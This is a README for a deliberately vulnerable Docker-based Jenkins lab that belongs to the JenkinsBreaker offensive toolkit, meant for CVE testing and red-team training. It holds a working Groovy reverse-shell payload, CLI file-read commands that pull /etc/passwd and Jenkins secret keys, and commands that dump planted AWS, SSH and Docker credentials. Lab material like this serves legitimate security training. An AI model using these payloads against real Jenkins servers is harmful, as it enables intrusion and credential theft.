# Jenkins Lab - Intentionally Vulnerable Testing Environment

WSL-compatible Docker-based Jenkins exploitation laboratory for CVE research, post-exploitation training, and CI/CD security testing.

## Overview

This lab provides a fully functional, intentionally vulnerable Jenkins environment designed for:

- CVE exploitation testing and validation
- Post-exploitation technique development
- Red team training and simulation
- CI/CD security research
- Offensive security tool development

**All vulnerabilities are intentionally deployed. This environment must only be used in isolated, controlled settings.**

## Supported CVEs

The lab includes vulnerable Jenkins core and plugin versions for the following CVEs:

| CVE ID | Type | Component | Description |
|--------|------|-----------|-------------|
| CVE-2018-1000861 | RCE | Jenkins Core ≤ 2.153 | Stapler web framework deserialization |
| CVE-2019-1003029 | RCE | Script Security ≤ 1.53 | Groovy sandbox bypass |
| CVE-2019-1003030 | RCE | Script Security ≤ 1.53 | Script Security bypass variant |
| CVE-2024-23897 | File Read → RCE | Jenkins Core ≤ 2.441 | CLI arbitrary file read via args4j |
| CVE-2020-2100 | DoS/RCE | Jenkins Core ≤ 2.218 | Git Plugin resource exhaustion |
| CVE-2020-2249 | XSS → RCE | Jenkins Core | Stored XSS in build logs |
| CVE-2019-10358 | Credential Leak | Credentials Plugin | Plaintext credential exposure |
| CVE-2019-1003040 | RCE | Script Security | Additional Groovy bypass |
| CVE-2021-21686 | RCE | Pipeline Groovy | Pipeline step injection |
| CVE-2018-1000600 | File Read | Jenkins Core | Arbitrary file disclosure |
| CVE-2018-1000402 | Credential Leak | AWS CodeDeploy ≤ 1.19 | AWS credentials exposure |

## Architecture

```
jenkins-lab/
├── docker-compose.yml          # Service orchestration
├── jenkins/
│   ├── Dockerfile              # Vulnerable Jenkins image
│   ├── plugins.txt             # Vulnerable plugin versions
│   ├── init.groovy.d/          # Bootstrap configuration
│   │   ├── 01-admin-user.groovy
│   │   ├── 02-disable-cli-security.groovy
│   │   └── 03-configure-credentials.groovy
│   ├── jobs/                   # Pre-configured vulnerable jobs
│   │   ├── vulnerable-pipeline/
│   │   └── aws-deployment/
│   └── secrets/                # Planted credentials
│       ├── aws_credentials
│       ├── id_rsa
│       ├── npmrc
│       ├── docker_config.json
│       └── maven_settings.xml
├── scripts/
│   ├── setup.sh                # Lab initialization
│   ├── cleanup.sh              # Teardown script
│   ├── generate_tokens.sh      # API token generator
│   └── test_exploits.sh        # Basic CVE validation
└── README.md
```

## System Requirements

### Host System
- Docker Engine 20.10+
- Docker Compose 1.29+
- 2GB RAM minimum (4GB recommended)
- 5GB free disk space
- WSL2 (for Windows users)

### Network Access
- No internet required (fully offline-capable)
- Ports 8080 and 50000 must be available
- Localhost-only binding (no external exposure by default)

## Installation

### WSL2 Setup (Windows)

Access WSL environment at `\\wsl.localhost\parrot`:

```bash
cd /path/to/heaplessNights/JenkinsBreaker/jenkins-lab

./scripts/setup.sh
```

### Linux/macOS

```bash
cd jenkins-lab

./scripts/setup.sh
```

The setup script will:
1. Build the vulnerable Jenkins Docker image
2. Start the container with docker-compose
3. Wait for Jenkins initialization
4. Validate that Jenkins is accessible

## Usage

### Starting the Lab

```bash
./scripts/setup.sh
```

**Access Jenkins:**
- URL: `http://localhost:8080`
- Username: `admin`
- Password: `admin`

### Testing Vulnerabilities

Run the basic validation script:

```bash
./scripts/test_exploits.sh
```

This performs:
- Jenkins version fingerprinting
- Plugin enumeration
- CLI jar download
- CVE-2024-23897 file read test
- Script console access check
- Credentials API validation

### Running JenkinsBreaker

From the parent directory:

```bash
cd ..
python3 JenkinsBreaker.py --url http://localhost:8080 --auto --lhost 127.0.0.1 --lport 9001
```

### Stopping the Lab

```bash
./scripts/cleanup.sh
```

Options:
- Preserve data volumes (default)
- Remove all data (prompted)

## Post-Exploitation Scenarios

### 1. Credentials Extraction

**Planted secrets locations:**

```bash
docker exec jenkins-lab cat /home/jenkins/.aws/credentials
docker exec jenkins-lab cat /home/jenkins/.ssh/id_rsa
docker exec jenkins-lab cat /home/jenkins/.npmrc
docker exec jenkins-lab cat /home/jenkins/.docker/config.json
docker exec jenkins-lab cat /home/jenkins/.m2/settings.xml
```

**Jenkins internal credentials:**

```bash
docker exec jenkins-lab cat /var/jenkins_home/credentials.xml
docker exec jenkins-lab cat /var/jenkins_home/secrets/master.key
docker exec jenkins-lab cat /var/jenkins_home/secrets/hudson.util.Secret
```

### 2. Job Configuration Secrets

Jobs with embedded credentials:
- `vulnerable-pipeline` - Environment variables with AWS keys, API tokens
- `aws-deployment` - Credentials binding with AWS access

Access via:
```bash
curl -u admin:admin http://localhost:8080/job/vulnerable-pipeline/config.xml
```

### 3. Privilege Escalation Vectors

**NOPASSWD sudo:**

The jenkins user has limited sudo access:

```bash
docker exec -u jenkins jenkins-lab sudo -l
```

**Writable paths:**

```bash
docker exec jenkins-lab ls -la /var/jenkins_home/workspace
```

### 4. Persistence Mechanisms

**Malicious pipeline:**

Create a job that executes on startup or schedules a reverse shell.

**Cronjob simulation:**

```bash
docker exec -u root jenkins-lab crontab -l
```

## CVE Testing Guide

### CVE-2024-23897 (CLI Arbitrary File Read)

**Download CLI:**

```bash
curl http://localhost:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
```

**Read /etc/passwd:**

```bash
java -jar jenkins-cli.jar -s http://localhost:8080 help "@/etc/passwd"
```

**Read Jenkins secrets:**

```bash
java -jar jenkins-cli.jar -s http://localhost:8080 help "@/var/jenkins_home/secrets/master.key"
java -jar jenkins-cli.jar -s http://localhost:8080 help "@/var/jenkins_home/secrets/hudson.util.Secret"
```

### CVE-2019-1003029 (Script Security Groovy RCE)

**Access Script Console:**

Navigate to: `http://localhost:8080/script`

**Execute Groovy:**

```groovy
def proc = "id".execute()
println proc.text
```

**Reverse Shell:**

```groovy
String host="127.0.0.1";
int port=9001;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### CVE-2018-1000861 (Stapler RCE)

**Exploit via deserialization:**

Requires crafted payload. Use JenkinsBreaker's automated module:

```bash
python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2018-1000861
```

## Security Controls (Intentionally Disabled)

For maximum exploitability:

- CSRF protection: **DISABLED**
- CLI authentication: **MINIMAL**
- Script approval: **DISABLED** (sandbox only)
- Agent-to-controller security: **RELAXED**
- Crumb issuer: **DISABLED**

## WSL Testing Validation

### From WSL Environment

```bash
cd /mnt/c/Users/<username>/.zenflow/worktrees/new-task-e6e5/JenkinsBreaker/jenkins-lab

docker ps
docker-compose ps

./scripts/test_exploits.sh
```

### Network Access

Verify from WSL:

```bash
curl -I http://localhost:8080
```

### Container Shell Access

```bash
docker exec -it jenkins-lab /bin/bash
```

## Troubleshooting

### Jenkins Not Starting

Check logs:

```bash
docker-compose logs jenkins
```

Common issues:
- Port 8080 already in use: `netstat -ano | findstr :8080` (Windows) or `lsof -i :8080` (Linux)
- Insufficient memory: Increase Docker memory limit
- Plugin installation failures: Check `jenkins/Dockerfile` RUN command

### WSL Docker Connection

Ensure Docker Desktop is running and WSL integration is enabled:

```bash
docker info
```

### Exploit Failures

1. Verify Jenkins version:
   ```bash
   curl -I http://localhost:8080 | grep X-Jenkins
   ```

2. Confirm plugin versions:
   ```bash
   curl -u admin:admin http://localhost:8080/pluginManager/api/json
   ```

3. Check CLI availability:
   ```bash
   curl http://localhost:8080/cli
   ```

## Development Notes

### Adding New Vulnerable Jobs

Create `jenkins/jobs/<job-name>/config.xml` and rebuild:

```bash
docker-compose down
docker-compose build
docker-compose up -d
```

### Updating Plugin Versions

Edit `jenkins/plugins.txt` and rebuild the image.

### Custom Secrets

Add files to `jenkins/secrets/` and update `Dockerfile` to copy them.

## Cleanup and Reset

**Full reset:**

```bash
./scripts/cleanup.sh
# Answer 'y' to remove volumes

./scripts/setup.sh
```

**Preserve custom jobs:**

```bash
docker cp jenkins-lab:/var/jenkins_home/jobs ./backup-jobs
```

## Legal and Ethical Use

This lab contains intentionally vulnerable software for authorized security research and training only.

**Prohibited uses:**
- Deployment on public networks
- Use against unauthorized targets
- Distribution without security context

**Required:**
- Isolated network environment
- Proper authorization for any testing
- Compliance with applicable laws

**Liability:**

The authors assume no responsibility for misuse. By deploying this lab, you accept full legal responsibility for its use.

## Integration with JenkinsBreaker

This lab is designed to validate all JenkinsBreaker exploit modules:

```bash
cd ..
python3 JenkinsBreaker.py --url http://localhost:8080 --auto --lhost 127.0.0.1 --lport 9001
```

Expected results:
- Version fingerprinting: Jenkins 2.138.3
- Plugin enumeration: 50+ plugins detected
- CVE matching: 11 applicable exploits
- Secrets extraction: AWS, SSH, NPM, Docker, Maven credentials
- Post-exploitation: File upload, command execution
- Report generation: JSON, Markdown, PDF

## References

- Jenkins Security Advisories: https://www.jenkins.io/security/advisories/
- CVE-2024-23897 Analysis: https://www.jenkins.io/security/advisory/2024-01-24/
- CVE-2018-1000861 Details: https://jenkins.io/security/advisory/2018-10-29/
- MITRE ATT&CK CI/CD Security: https://attack.mitre.org/

## Support

For issues with this lab environment:

1. Check `docker-compose logs jenkins`
2. Review Jenkins logs: `docker exec jenkins-lab cat /var/jenkins_home/jenkins.log`
3. Validate Docker/WSL configuration
4. Ensure no port conflicts

This lab is part of the JenkinsBreaker project. See parent README for full context.
